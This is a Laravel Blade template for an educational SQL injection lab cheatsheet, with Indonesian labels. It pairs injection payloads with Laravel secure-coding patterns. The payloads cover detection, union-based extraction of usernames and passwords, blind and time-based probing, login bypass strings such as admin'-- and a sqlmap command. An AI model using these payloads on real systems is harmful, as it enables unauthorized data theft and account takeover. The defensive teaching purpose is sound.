{{-- ============================================ --}}
{{-- SQLI LAB: Cheatsheet --}}
{{-- Referensi Payload dan Prevention --}}
{{-- ============================================ --}}

@extends('layouts.app')

@section('title', 'SQL Injection Cheatsheet')

@section('content')
<div class="container py-4">
    <div class="row justify-content-center">
        <div class="col-lg-10">

            {{-- Breadcrumb --}}
            <nav aria-label="breadcrumb">
                <ol class="breadcrumb">
                    <li class="breadcrumb-item"><a href="{{ route('sqli-lab.index') }}">SQLi Lab</a></li>
                    <li class="breadcrumb-item active">Cheatsheet</li>
                </ol>
            </nav>

            {{-- Warning --}}
            <div class="alert alert-danger">
                <div class="d-flex align-items-center">
                    <i class="bi bi-exclamation-octagon-fill fs-1 me-3"></i>
                    <div>
                        <h5 class="alert-heading mb-1">PERINGATAN!</h5>
                        <p class="mb-0">
                            Cheatsheet ini hanya untuk pembelajaran defensive security.
                            Menggunakan teknik ini untuk menyerang sistem tanpa izin adalah <strong>ILEGAL</strong>.
                        </p>
                    </div>
                </div>
            </div>

            {{-- Header --}}
            <div class="text-center mb-5">
                <h1 class="display-5 fw-bold">
                    <i class="bi bi-journal-code text-dark"></i>
                    SQL Injection Cheatsheet
                </h1>
                <p class="text-muted">
                    Referensi lengkap: Payload testing & secure coding patterns
                </p>
            </div>

            {{-- Section 1: Detection Payloads --}}
            <div class="card mb-4">
                <div class="card-header bg-danger text-white">
                    <h5 class="mb-0">
                        <i class="bi bi-bug"></i> 1. Detection Payloads
                    </h5>
                    <small>Untuk menemukan vulnerability</small>
                </div>
                <div class="card-body p-0">
                    <div class="table-responsive">
                        <table class="table table-sm mb-0">
                            <thead class="table-light">
                                <tr>
                                    <th>Payload</th>
                                    <th>Tujuan</th>
                                    <th>Expected Response</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td><code>'</code></td>
                                    <td>Test string termination</td>
                                    <td>SQL syntax error</td>
                                </tr>
                                <tr>
                                    <td><code>"</code></td>
                                    <td>Test double quote</td>
                                    <td>SQL syntax error</td>
                                </tr>
                                <tr>
                                    <td><code>' OR '1'='1</code></td>
                                    <td>Boolean true test</td>
                                    <td>All records returned</td>
                                </tr>
                                <tr>
                                    <td><code>' OR '1'='2</code></td>
                                    <td>Boolean false test</td>
                                    <td>No records</td>
                                </tr>
                                <tr>
                                    <td><code>' AND '1'='1</code></td>
                                    <td>AND true (filter)</td>
                                    <td>Normal results</td>
                                </tr>
                                <tr>
                                    <td><code>1' ORDER BY 1--</code></td>
                                    <td>Column count</td>
                                    <td>Normal / error</td>
                                </tr>
                                <tr>
                                    <td><code>' AND SLEEP(5)--</code></td>
                                    <td>Time-based blind</td>
                                    <td>5 second delay</td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>

            {{-- Section 2: Comment Syntax --}}
            <div class="card mb-4">
                <div class="card-header bg-warning text-dark">
                    <h5 class="mb-0">
                        <i class="bi bi-chat-left-text"></i> 2. Comment Syntax per Database
                    </h5>
                </div>
                <div class="card-body p-0">
                    <div class="table-responsive">
                        <table class="table table-sm mb-0">
                            <thead class="table-light">
                                <tr>
                                    <th>Database</th>
                                    <th>Single Line</th>
                                    <th>Multi Line</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td><strong>MySQL</strong></td>
                                    <td><code>#</code> atau <code>-- </code> (spasi)</td>
                                    <td><code>/* */</code></td>
                                </tr>
                                <tr>
                                    <td><strong>PostgreSQL</strong></td>
                                    <td><code>-- </code></td>
                                    <td><code>/* */</code></td>
                                </tr>
                                <tr>
                                    <td><strong>SQLite</strong></td>
                                    <td><code>-- </code></td>
                                    <td><code>/* */</code></td>
                                </tr>
                                <tr>
                                    <td><strong>SQL Server</strong></td>
                                    <td><code>-- </code></td>
                                    <td><code>/* */</code></td>
                                </tr>
                                <tr>
                                    <td><strong>Oracle</strong></td>
                                    <td><code>-- </code></td>
                                    <td><code>/* */</code></td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>

            {{-- Section 3: Union-Based --}}
            <div class="card mb-4">
                <div class="card-header bg-primary text-white">
                    <h5 class="mb-0">
                        <i class="bi bi-union"></i> 3. Union-Based Injection
                    </h5>
                </div>
                <div class="card-body">
                    <h6>Step 1: Temukan jumlah kolom</h6>
                    <pre class="bg-dark text-light p-2 rounded small"><code>' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--  ← Sampai error, berarti kolom = N-1</code></pre>

                    <h6 class="mt-3">Step 2: Temukan kolom yang ditampilkan</h6>
                    <pre class="bg-dark text-light p-2 rounded small"><code>' UNION SELECT 1,2,3,4,5--
' UNION SELECT NULL,NULL,NULL,NULL,NULL--</code></pre>

                    <h6 class="mt-3">Step 3: Extract informasi database</h6>
                    <pre class="bg-dark text-light p-2 rounded small"><code>-- MySQL
' UNION SELECT 1,version(),database(),user(),5--
' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables--
' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_name='users'--

-- SQLite
' UNION SELECT 1,sql,3,4,5 FROM sqlite_master--</code></pre>

                    <h6 class="mt-3">Step 4: Extract data</h6>
                    <pre class="bg-dark text-light p-2 rounded small"><code>' UNION SELECT 1,username,password,email,5 FROM users--</code></pre>
                </div>
            </div>

            {{-- Section 4: Blind SQLi --}}
            <div class="card mb-4">
                <div class="card-header bg-info text-white">
                    <h5 class="mb-0">
                        <i class="bi bi-eye-slash"></i> 4. Blind SQL Injection
                    </h5>
                </div>
                <div class="card-body">
                    <div class="row">
                        <div class="col-md-6">
                            <h6>Boolean-Based</h6>
                            <pre class="bg-dark text-light p-2 rounded small"><code>-- Test true/false response
' AND 1=1--   ← Normal
' AND 1=2--   ← Different

-- Extract data karakter per karakter
' AND SUBSTRING(username,1,1)='a'--
' AND SUBSTRING(username,1,1)='b'--
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='p'--</code></pre>
                        </div>
                        <div class="col-md-6">
                            <h6>Time-Based</h6>
                            <pre class="bg-dark text-light p-2 rounded small"><code>-- MySQL
' AND SLEEP(5)--
' AND IF(1=1, SLEEP(5), 0)--
' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)--

-- PostgreSQL
'; SELECT pg_sleep(5)--

-- SQL Server
'; WAITFOR DELAY '0:0:5'--</code></pre>
                        </div>
                    </div>
                </div>
            </div>

            {{-- Section 5: Authentication Bypass --}}
            <div class="card mb-4">
                <div class="card-header bg-danger text-white">
                    <h5 class="mb-0">
                        <i class="bi bi-key"></i> 5. Authentication Bypass
                    </h5>
                </div>
                <div class="card-body p-0">
                    <div class="table-responsive">
                        <table class="table table-sm mb-0">
                            <thead class="table-light">
                                <tr>
                                    <th>Username</th>
                                    <th>Password</th>
                                    <th>Efek</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td><code>admin'--</code></td>
                                    <td>(anything)</td>
                                    <td>Login as admin</td>
                                </tr>
                                <tr>
                                    <td><code>admin'#</code></td>
                                    <td>(anything)</td>
                                    <td>Login as admin (MySQL)</td>
                                </tr>
                                <tr>
                                    <td><code>' OR '1'='1</code></td>
                                    <td><code>' OR '1'='1</code></td>
                                    <td>Login as first user</td>
                                </tr>
                                <tr>
                                    <td><code>' OR 1=1--</code></td>
                                    <td>(anything)</td>
                                    <td>Login as first user</td>
                                </tr>
                                <tr>
                                    <td><code>admin' AND '1'='1</code></td>
                                    <td>(anything)</td>
                                    <td>Test if admin exists</td>
                                </tr>
                                <tr>
                                    <td><code>' UNION SELECT 1,'admin','pass','a@b.com','admin'--</code></td>
                                    <td><code>pass</code></td>
                                    <td>Inject fake user</td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>

            {{-- Section 6: Prevention Cheatsheet --}}
            <div class="card mb-4">
                <div class="card-header bg-success text-white">
                    <h5 class="mb-0">
                        <i class="bi bi-shield-check"></i> 6. Prevention Cheatsheet (Laravel)
                    </h5>
                </div>
                <div class="card-body">

                    {{-- DO --}}
                    <h6 class="text-success">✅ LAKUKAN (SECURE)</h6>
                    <pre class="bg-dark text-light p-3 rounded small"><code><span class="text-success">// 1. Eloquent ORM (Recommended)</span>
User::where('email', $request->email)->first();
Product::find($id);
Product::where('name', 'LIKE', '%' . $search . '%')->get();

<span class="text-success">// 2. Query Builder (Recommended)</span>
DB::table('users')->where('email', $request->email)->first();
DB::table('products')->whereIn('id', $ids)->get();

<span class="text-success">// 3. Parameter Binding</span>
DB::select('SELECT * FROM users WHERE email = ?', [$email]);
DB::select('SELECT * FROM users WHERE email = :email', ['email' => $email]);

<span class="text-success">// 4. Validation + Type Casting</span>
$request->validate(['id' => 'required|integer']);
$id = (int) $request->id;

<span class="text-success">// 5. whereRaw dengan binding</span>
User::whereRaw('email = ?', [$email])->get();</code></pre>

                    {{-- DON'T --}}
                    <h6 class="text-danger mt-4">❌ JANGAN LAKUKAN (VULNERABLE)</h6>
                    <pre class="bg-dark text-light p-3 rounded small"><code><span class="text-danger">// 1. String Concatenation</span>
$sql = "SELECT * FROM users WHERE email = '$email'";
DB::select($sql);  // VULNERABLE!

<span class="text-danger">// 2. Variable dalam query string</span>
DB::select("SELECT * FROM users WHERE id = $id");

<span class="text-danger">// 3. whereRaw tanpa binding</span>
User::whereRaw("email = '$email'")->get();

<span class="text-danger">// 4. orderByRaw tanpa validasi</span>
User::orderByRaw($request->sort)->get();  // VULNERABLE!

<span class="text-danger">// 5. selectRaw tanpa binding</span>
User::selectRaw("*, $userInput as alias")->get();</code></pre>
                </div>
            </div>

            {{-- Section 7: Laravel Specific --}}
            <div class="card mb-4">
                <div class="card-header bg-dark text-white">
                    <h5 class="mb-0">
                        <i class="bi bi-code-square"></i> 7. Laravel Raw Queries - Secure Way
                    </h5>
                </div>
                <div class="card-body">
                    <div class="row">
                        <div class="col-md-6">
                            <h6>whereRaw</h6>
                            <pre class="bg-dark text-light p-2 rounded small"><code>// Secure
User::whereRaw('age > ? AND status = ?', [18, 'active'])->get();

// Untuk column name dari user input:
$allowedColumns = ['name', 'email', 'created_at'];
$column = in_array($input, $allowedColumns) ? $input : 'name';
User::orderBy($column)->get();</code></pre>
                        </div>
                        <div class="col-md-6">
                            <h6>havingRaw / selectRaw</h6>
                            <pre class="bg-dark text-light p-2 rounded small"><code>// Secure
DB::table('orders')
    ->selectRaw('COUNT(*) as count, status')
    ->groupBy('status')
    ->havingRaw('COUNT(*) > ?', [10])
    ->get();</code></pre>
                        </div>
                    </div>
                </div>
            </div>

            {{-- Section 8: Testing Tools --}}
            <div class="card mb-4">
                <div class="card-header">
                    <h5 class="mb-0">
                        <i class="bi bi-tools"></i> 8. Tools untuk Testing
                    </h5>
                </div>
                <div class="card-body">
                    <div class="row">
                        <div class="col-md-4">
                            <h6>Manual Testing</h6>
                            <ul class="small">
                                <li>Browser DevTools</li>
                                <li>Burp Suite (intercept)</li>
                                <li>Postman / Insomnia</li>
                                <li>curl</li>
                            </ul>
                        </div>
                        <div class="col-md-4">
                            <h6>Automated Tools</h6>
                            <ul class="small">
                                <li><strong>sqlmap</strong> - Auto SQLi detection</li>
                                <li>OWASP ZAP</li>
                                <li>Burp Scanner (Pro)</li>
                                <li>Nikto</li>
                            </ul>
                        </div>
                        <div class="col-md-4">
                            <h6>Laravel Specific</h6>
                            <ul class="small">
                                <li>Laravel Debugbar</li>
                                <li>Telescope (query log)</li>
                                <li>PHPStan / Psalm (static)</li>
                                <li>Security advisories check</li>
                            </ul>
                        </div>
                    </div>

                    <div class="alert alert-info mt-3 mb-0 small">
                        <strong>sqlmap example:</strong>
                        <code>sqlmap -u "http://target.com/search?q=test" --dbs</code>
                    </div>
                </div>
            </div>

            {{-- Quick Reference Card --}}
            <div class="card mb-4 border-primary">
                <div class="card-header bg-primary text-white">
                    <h5 class="mb-0">
                        <i class="bi bi-bookmark-star"></i> Quick Reference
                    </h5>
                </div>
                <div class="card-body">
                    <div class="row text-center">
                        <div class="col-md-3">
                            <div class="p-3 bg-danger text-white rounded">
                                <h6>VULNERABLE</h6>
                                <code class="text-white">"...WHERE x='$input'"</code>
                            </div>
                        </div>
                        <div class="col-md-3">
                            <div class="p-3 bg-success text-white rounded">
                                <h6>ELOQUENT</h6>
                                <code class="text-white">Model::where('x', $input)</code>
                            </div>
                        </div>
                        <div class="col-md-3">
                            <div class="p-3 bg-success text-white rounded">
                                <h6>QUERY BUILDER</h6>
                                <code class="text-white">DB::table()->where()</code>
                            </div>
                        </div>
                        <div class="col-md-3">
                            <div class="p-3 bg-success text-white rounded">
                                <h6>BINDING</h6>
                                <code class="text-white">DB::select('...?', [$x])</code>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            {{-- Navigation --}}
            <div class="d-flex justify-content-between mt-4">
                <a href="{{ route('sqli-lab.secure-search') }}" class="btn btn-outline-success">
                    <i class="bi bi-arrow-left"></i> Secure Search Demo
                </a>
                <a href="{{ route('sqli-lab.index') }}" class="btn btn-primary">
                    Kembali ke Menu <i class="bi bi-house"></i>
                </a>
            </div>

        </div>
    </div>
</div>
@endsection
